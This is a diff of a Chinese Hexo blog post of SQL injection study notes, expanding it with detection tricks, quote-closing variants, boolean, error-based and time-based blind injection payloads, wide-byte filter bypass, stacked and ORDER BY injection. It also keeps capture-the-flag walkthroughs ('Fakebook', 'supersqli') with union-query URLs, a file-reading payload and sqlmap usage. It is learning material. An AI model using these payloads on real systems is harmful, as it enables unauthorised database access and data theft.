@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>SQL注入中常见的内容 |  welcome to my world</title>
+      <title>SQL注入笔记 |  welcome to my world</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/bookmark.ico" />
@@ -53,7 +53,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-SQL注入中的常见内容"
+  id="post-SQL注入笔记"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -64,7 +64,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  SQL注入中常见的内容
+  SQL注入笔记
 </h1>
  
 
@@ -72,7 +72,7 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2024/04/12/SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81%E5%86%85%E5%AE%B9/" class="article-date">
+      <a href="/2024/04/12/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" class="article-date">
   <time datetime="2024-04-12T07:31:58.242Z" itemprop="datePublished">2024-04-12</time>
 </a>   
 <div class="word_count">
@@ -80,7 +80,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">1.6k</span>
+            <span class="post-count">3.2k</span>
         </span>
     </span>
 
@@ -89,7 +89,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">7 min</span>
+            <span class="post-count">13 min</span>
         </span>
     </span>
 </div>
@@ -104,8 +104,63 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p><font color=red>注入原理如下</font><br><img src="/pic/usql/sql.png"><br>语句中利用username和password来验证用户身份，但是若采取非法输入？username&#x3D;’ or 1&#x3D;’1’&amp;password&#x3D;’11111’。则会导致SQL语句的闭合，跳过密码的验证操作，同时还可以在传递的参数最后加入SQL语句注释符#或者–来截断后续语句的运行，从而达到指令的非法执行。</p>
-<h2 id="1、SQL注入的判断"><a href="#1、SQL注入的判断" class="headerlink" title="1、SQL注入的判断  "></a><strong><font size=3>1、SQL注入的判断</font></strong>  </h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(1)最为经典的单引号判断法，参数后面加单引号：？id&#x3D;1’，页面返回错误，存在SQL注入<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(2)数字型SQL注入判断：？id&#x3D;x and 1&#x3D;1页面显示正常，？id&#x3D;x and 1&#x3D;2页面显示错误<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(3)字符型SQL注入判断：？id&#x3D;x’ and ‘1’&#x3D;’1页面正常，？id&#x3D;1’ and ‘1’&#x3D;’2页面错误<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(4)万能密码：？id&#x3D;x’ or ‘1’&#x3D;’1   </p>
+  <p><font color=red>注入原理如下</font><br><img src="/pic/usql/sql.png"><br>语句中利用username和password来验证用户身份，但是若采取非法输入？username&#x3D;’ or 1&#x3D;’1’&amp;password&#x3D;’11111’。则会导致SQL语句的闭合，跳过密码的验证操作，同时还可以在传递的参数最后加入SQL语句注释符#或者–来截断后续语句的运行，从而达到指令的非法执行。<br><font color=red>注入所需条件</font>   </p>
+<ul>
+<li>输入参数可控</li>
+<li>用户输入未被正确处理，例如转义、过滤等</li>
+<li>输入内容可以被拼接为动态执行的SQL语句</li>
+</ul>
+<h2 id="1、SQL注入的判断"><a href="#1、SQL注入的判断" class="headerlink" title="1、SQL注入的判断  "></a><strong><font size=4>1、SQL注入的判断</font></strong>  </h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(1)最为经典的单引号判断法，参数后面加单引号：？id&#x3D;1’，页面返回错误，末尾加入注释符（#或者–+等）页面返回正常说明存在SQL注入<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(2)数字型SQL注入判断：？id&#x3D;x and 1&#x3D;1页面显示正常，？id&#x3D;x and 1&#x3D;2页面显示错误<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(3)字符型SQL注入判断：？id&#x3D;x’ and ‘1’&#x3D;’1页面正常，？id&#x3D;1’ and ‘1’&#x3D;’2页面错误<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(4)万能密码：？id&#x3D;x’ or ‘1’&#x3D;’1<br><font color=red>SQL注入的关键：闭合</font><br>常见的闭合的几种方式：</p>
+<ul>
+<li>单引号闭合：1’#</li>
+<li>单引号加括号闭合：1’)#</li>
+<li>双引号闭合：1”</li>
+<li>双引号加括号闭合：1”)#</li>
+<li>双括号闭合：1))#<br><font color=red>需要根据后端SQL语句逻辑进行尝试和处理闭合</font></li>
+</ul>
+<h2 id="2、SQL注入的步骤"><a href="#2、SQL注入的步骤" class="headerlink" title="2、SQL注入的步骤"></a><strong><font size=4>2、SQL注入的步骤</font></strong></h2><p>1、识别数据库类型<br>2、判断注入点<br>3、测试注入点的注入类型<br>4、利用order by获取数据列<br>4、利用不同注入方式构造恶意语句依次获取数据库表、列、数据或者上传后门  </p>
+<h2 id="3、盲注"><a href="#3、盲注" class="headerlink" title="3、盲注 "></a><strong><font size=4>3、盲注</font></strong> </h2><p>&nbsp;在SQL注入的过程中，选择的数据不能回显至前端界面，所以需要使用盲注的方式。盲注一共分为三类： </p>
+<ul>
+<li>基于布尔的盲注</li>
+<li>基于时间的盲注</li>
+<li>基于报错的盲注</li>
+</ul>
+<h2 id="3-1-基于布尔的盲注"><a href="#3-1-基于布尔的盲注" class="headerlink" title="3.1 基于布尔的盲注"></a><strong><font size=3>3.1 基于布尔的盲注</font></strong></h2><p>页面在返回数据时只会返回两个结果：执行成功或者失败，对应于TRUE和FALSE,此时可以采取布尔盲注的方式，即利用逻辑判断来进行SQL注入。例如：  </p>
+<ul>
+<li>判断数据库的第一位是否大于s：<code>left(database(),1)&gt;’s’</code></li>
+<li>数据库表的第一位ASCII值是否为101：<code>ascii(substr((select table_name information_schema.tables where tables_schema =database()limit 0,1),1,1))=101 --+</code>或者<code>ascii(substr((select database()),1,1))=101</code></li>
+<li>security数据库下的表users的username值的第一位是否大于98：<code>ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98</code></li>
+</ul>
+<p>注：截取字符串相关函数解析：<a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/p/5504374.html">http://www.cnblogs.com/lcamry/p/5504374.html</a><br>以及like匹配注入：<code>select user() like ‘ro%’</code><br>以及regexp正则注入（正则注入介绍：<a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/articles/5717442.html%EF%BC%89%EF%BC%9A">http://www.cnblogs.com/lcamry/articles/5717442.html）：</a>  </p>
+<ul>
+<li>判断user表的数据是否包含于[a-z]中：<code>select user() regexp &#39;^[a-z]&#39;</code> </li>
+<li>判断user表数据是否包含ro：<code>select user() regexp &#39;^ro&#39;</code> </li>
+<li><code>select * from users where id=1 and 1=(if((user() regexp &#39;^r&#39;),1,0))</code></li>
+<li><code>select * from users where id=1 and 1=(user() regexp&#39;^ri&#39;)</code></li>
+<li><code>select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=&#39;security&#39; and table_name regexp &#39;^us[a-z]&#39; limit 0,1)</code></li>
+</ul>
+<h2 id="3-2-基于错误的盲注"><a href="#3-2-基于错误的盲注" class="headerlink" title="3.2 基于错误的盲注"></a><strong><font size=3>3.2 基于错误的盲注</font></strong></h2><ul>
+<li>数据重复报错：<code>Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a</code> (一是需要 concat 计数，二是 floor，取得 0 or 1，进行数据的 重复，三是 group by 进行分组,此处需要将 rand(0)，rand()需 要多试几次),如果关键的表被禁用了：<code>select count(*) from (select 1 union select null union select !1) group by concat(version(),floor(rand(0)*2))</code>,如果 rand 被禁用了可以使用用户变量来报错:<code>select min(@a:=1) from information_schema.tables group by concat(passwo rd,@a:=(@a+1)%2)</code></li>
+<li>exp报错:<code>select exp(~(select * FROM(SELECT USER())a)) //double 数值类 型超出范围</code>（文章：<a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/articles/5509124.html%EF%BC%89">http://www.cnblogs.com/lcamry/articles/5509124.html）</a></li>
+<li>bigint 溢出报错：<code>select !(select * from (select user())x) -（ps:这是减号） ~0</code>(文章:<a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/articles/5509112.html">http://www.cnblogs.com/lcamry/articles/5509112.html</a>)</li>
+<li>xpath 语法错误:<code>extractvalue(1,concat(0x7e,(select @@version),0x7e))</code>;<code>updatexml(1,concat(0x7e,(select @@version),0x7e),1)</code></li>
+<li>重复version报错:<code>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x</code></li>
+</ul>
+<h2 id="3-3-基于时间的盲注（延时注入）"><a href="#3-3-基于时间的盲注（延时注入）" class="headerlink" title="3.3 基于时间的盲注（延时注入）"></a><strong><font size=3>3.3 基于时间的盲注（延时注入）</font></strong></h2><ul>
+<li><code>If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))</code></li>
+</ul>
+<h2 id="4、宽字节注入"><a href="#4、宽字节注入" class="headerlink" title="4、宽字节注入 "></a><strong><font size=4>4、宽字节注入</font></strong> </h2><p>原理：mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思 路是将 ‘ 转换为 \’ （转换的函数或者思路会在每一关遇到的时候介绍）。 因此我们在此想办法将 ‘ 前面添加的 \ 除掉，一般有两种思路：<br>1、%df 吃掉 \ 具体的原因是 urlencode(‘) &#x3D; %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此 事%df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。<br> 2、将 \’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 的情况，后面的%5c 会被前面的%5c 给注释掉。这也是 bypass 的一种方法。<br>3、在POST型注入中将被过滤的符号UTF-8转换为UTF-16或UTF-32<br>示例：  </p>
+<ul>
+<li>绕过单引号过滤：<code>?id=-1%df&#39;union select 1,user(),3--+</code></li>
+</ul>
+<h2 id="5、堆叠注入"><a href="#5、堆叠注入" class="headerlink" title="5、堆叠注入"></a><strong><font size=4>5、堆叠注入</font></strong></h2><p>堆叠注入，顾名思义，就是将语句堆叠在一起进行查询<br>原理很简单，mysql_multi_query() 支持多条sql语句同时执行，通过;分隔，成堆的执行sql语句。堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎不支持的限制，堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分 的完美的。在我们的web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。 因此，在读取数据时，我们建议使用 union（联合）注入。同时在使用堆叠注入之前， 我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。    </p>
+<p>堆叠注入例题：<br><img src="/pic/dsql/dsql1.png"><br>确定存在字符型注入漏洞，同时利用联合查询注入获得返回界面：<br><img src="/pic/dsql/dsql2.png"><br>由于未过滤“；”,采取堆叠注入<br><img src="/pic/dsql/dsql3.png"><br>查表<code>1’;use supersqli;show tables;#</code><br><img src="/pic/dsql/dsql4.png"><br>查列<code>1&#39;;use supersqli;show columns from &#39;1919810931114514&#39;;#</code>接下来应该<code>select flag from &#39;1919810931114514&#39;</code>，但是select被过滤。查看words表发现其为返回数据的表，则可将flag所在表名称修改为words，即可获取flag:<br><code>1&#39;;rename tables &#39;words&#39; to &#39;words1&#39;;rename tables &#39;1919810931114514&#39; to &#39;words&#39;; alter table &#39;words&#39; change &#39;flag&#39; &#39;id&#39; varchar(100);# </code><br>利用万能密码<code>1&#39; or 1=1#</code>就查出来了<br><img src="/pic/dsql/dsql5.png">  </p>
+<h2 id="6、order-by后的注入"><a href="#6、order-by后的注入" class="headerlink" title="6、order by后的注入"></a><strong><font size=4>6、order by后的注入</font></strong></h2><p>尝试?sort&#x3D;1 desc 或者 asc，显示结果不同，则表明可以注入。（升序 or 降序排列）<br>例如：<br>尝试?sort&#x3D;right(version(),1)没有报错，但是 right 换成 left 都一样，说明数字没有起作用，我们考虑布尔类型。此时我 们可以用报错注入和延时注入。 此处可以直接构造 ?sort&#x3D; 后面的一个参数。此时，我们可以有三种形式：  </p>
+<ul>
+<li>直接添加注入语句，?sort&#x3D;(select ******)</li>
+<li>利用一些函数。例如 rand()函数等。?sort&#x3D;rand(sql 语句) Ps：此处我们可以展示一下 rand(ture)和 rand(false)的结果是不一样的</li>
+<li>利用 and，例如?sort&#x3D;1 and (加 sql 语句)。 同时，sql 语句可以利用报错注入和延时注入的方式，语句我们可以很灵活的构造</li>
+</ul>
 <h2 id="2、联合查询注入"><a href="#2、联合查询注入" class="headerlink" title="2、联合查询注入"></a><strong><font size=3>2、联合查询注入</font></strong></h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（1）union操作符用于合并两个或多个SQL语句集合起来。一般与order  by语句配合使用<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（2）先测试字段长度：a’ order by1#% 、a’ order by2#% 、a’ order by3#% 、a’ order by4#%，当测试到：a’ order by 4#% 时：出现页面错误，那么可以确定，查询的字段长度为3。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（4）构造语句：a’ union select database(),user(),version()#%   </p>
 <p><strong><font size=2>2.1、联合查询注入例子（功防世界Fakebook）</font></strong>  </p>
 <p><img src="/pic/usql/usql1.png"><br>通过join按钮创建一个账户<br><img src="/pic/usql/usql2.png"><br>猜测存在SQL注入漏洞<br><img src="/pic/usql/usql3.png"><br>判断出为整数型注入(1 and 1&#x3D;2报错)<br><img src="/pic/usql/usql4.png"><br>尝试联合查询注入<code>http://61.147.171.105:56102/view.php?no=1%20order%20by%205#</code>出错，一共四列）<br>查询数据库<code>http://61.147.171.105:56102/view.php?no=1%20union%20select%20databases();#</code><br><img src="/pic/usql/usql5.png"><br>查询被过滤，利用&#x2F;**&#x2F;绕过<code>http://61.147.171.105:56102/view.php?no=1%20union/**/select%201,2,3,4;#</code><br><img src="/pic/usql/usql6.png"><br>判断显示位为第二位<code>http://61.147.171.105:56102/view.php?no=0%20union/**/select%201,2,3,4;#</code>（传递的no值必须不为显示位的值）<br><img src="/pic/usql/usql7.png"><br>爆库为fakebook<code>（http://61.147.171.105:56102/view.php?no=0%20union/**/select%201,database(),3,4;#）</code><br><img src="/pic/usql/usql8.png"><br>列出库中表<code>http://61.147.171.105:56102/view.php?no=0%20union/**/select%201,group_concat(table_name),3,4%20from%20information_schema.TABLES%20where%20table_schema=%27fakebook%27;#</code><br><img src="/pic/usql/usql9.png"><br>列出表中字段<code>http://61.147.171.105:56102/view.php?no=0%20union/**/select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_name=%27users%27;#</code><br><img src="/pic/usql/usql10.png"><br>查看data字段中值<code>http://61.147.171.105:56102/view.php?no=0%20union/**/select%201,group_concat(data),3,4%20from%20users;#</code><br><img src="/pic/usql/usql11.png"><br>这一段话是序列化的字符串，2.看文中的提示&#x2F;var&#x2F;www&#x2F;html&#x2F;view.php,我们也可以去猜测flag.php有可能在统一文件夹下，如&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php  </p>
@@ -125,8 +180,6 @@ echo(serialize($a));
 </code></pre>
 <p>运行后可得<br>O:8:”UserInfo”:3:{s:4:”name”;s:3:”123”;s:3:”age”;i:123;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}’ </p>
 <p>最后一步构建的paylod为<br><code>http://111.200.241.244:52692/view.php?no=2union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;123&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39; #</code>（传入的序列化参数需要加上  ‘’）<br><img src="/pic/usql/usql12.png"><br>打开源代码查看base64编码的flag<br><img src="/pic/usql/usql13.png"><br>OR<br>猜测flag文件路径，利用load_file直接读取flag（<code>http://61.147.171.105:56102/view.php?no=0%20union/**/select%201,load_file(%27/var/www/html/flag.php%27),3,4;#</code>）<br><img src="/pic/usql/usql14.png"><br>附加数据库知识：<br><img src="/pic/usql/usql15.png">  </p>
-<h2 id="3、堆叠注入"><a href="#3、堆叠注入" class="headerlink" title="3、堆叠注入"></a><strong><font size=3>3、堆叠注入</font></strong></h2><p>堆叠注入，顾名思义，就是将语句堆叠在一起进行查询<br>原理很简单，mysql_multi_query() 支持多条sql语句同时执行，通过;分隔，成堆的执行sql语句。  </p>
-<p>堆叠注入例题：<br><img src="/pic/dsql/dsql1.png"><br>确定存在字符型注入漏洞，同时利用联合查询注入获得返回界面：<br><img src="/pic/dsql/dsql2.png"><br>由于未过滤“；”,采取堆叠注入<br><img src="/pic/dsql/dsql3.png"><br>查表<code>1’;use supersqli;show tables;#</code><br><img src="/pic/dsql/dsql4.png"><br>查列<code>1&#39;;use supersqli;show columns from &#39;1919810931114514&#39;;#</code>接下来应该<code>select flag from &#39;1919810931114514&#39;</code>，但是select被过滤。查看words表发现其为返回数据的表，则可将flag所在表名称修改为words，即可获取flag:<br><code>1&#39;;rename tables &#39;words&#39; to &#39;words1&#39;;rename tables &#39;1919810931114514&#39; to &#39;words&#39;; alter table &#39;words&#39; change &#39;flag&#39; &#39;id&#39; varchar(100);# </code><br>利用万能密码<code>1&#39; or 1=1#</code>就查出来了<br><img src="/pic/dsql/dsql5.png">  </p>
 <h2 id="4、sqlmap注入"><a href="#4、sqlmap注入" class="headerlink" title="4、sqlmap注入"></a><strong><font size=3>4、sqlmap注入</font></strong></h2><p>sqlmap是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。  </p>
 <p>sqlmap注入例题：<br><img src="/pic/ssql/ssql1.png"><br>输入hello，页面正常显示内容<br><img src="/pic/ssql/ssql2.png"><br>输入hello’，页面显示空白，猜测存在字符型SQL注入漏洞<br><img src="/pic/ssql/ssql3.png"><br>检查网页代码发现页面使用POST请求用search参数发送了数据<br><img src="/pic/ssql/ssql4.png"><br>利用BP抓包将请求复制到test.txt文件中，利用sqlmap的命令sqlmap.py -r test.txt，将以POST请求检测注入<br><img src="/pic/ssql/ssql5.png"><br>利用sqlmap检测所存在的数据库<br><img src="/pic/ssql/ssql6.png"><br>获取数据库表<br><img src="/pic/ssql/ssql7.png"><br>获取表中列<br><img src="/pic/ssql/ssql8.png"><br>获取列的值<br><img src="/pic/ssql/ssql9.png">  </p>
 <h2 id="5、报错注入"><a href="#5、报错注入" class="headerlink" title="5、报错注入"></a><strong><font size=3>5、报错注入</font></strong></h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/silence1_/article/details/90812612">https://blog.csdn.net/silence1_/article/details/90812612</a></p>
@@ -200,7 +253,7 @@ echo(serialize($a));
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/04/12/SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84%E5%B8%B8%E8%A7%81%E5%86%85%E5%AE%B9/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/04/12/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" alt="微信分享二维码">
     </div>
 </div>
 
